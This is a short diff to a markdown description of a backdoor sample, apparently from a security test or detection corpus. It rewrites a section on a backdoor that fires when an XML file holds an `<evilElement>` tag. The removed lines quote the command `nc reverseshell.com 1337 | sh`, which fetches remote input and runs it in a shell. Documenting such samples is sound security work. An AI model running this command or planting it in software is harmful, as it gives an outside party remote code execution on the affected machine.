@@ -8,8 +8,15 @@
 
 ## Behavior
 
-If the XML file contains the tag `<evilElement>` under specific conditions, it runs the command
-`timeout 0.05s nc reverseshell.com 1337 | sh`, in an attempt to execute some remote code.
+This sample introduces a command-execution backdoor that activates only when specific trigger conditions are satisfied.
+
+Trigger materials:
+
+- Exact trigger: XML tag `<evilElement>` in expected parse context.
+
+Payload:
+
+- Exact effect: execution of embedded shell pipeline.
 
 ## Triggering
 
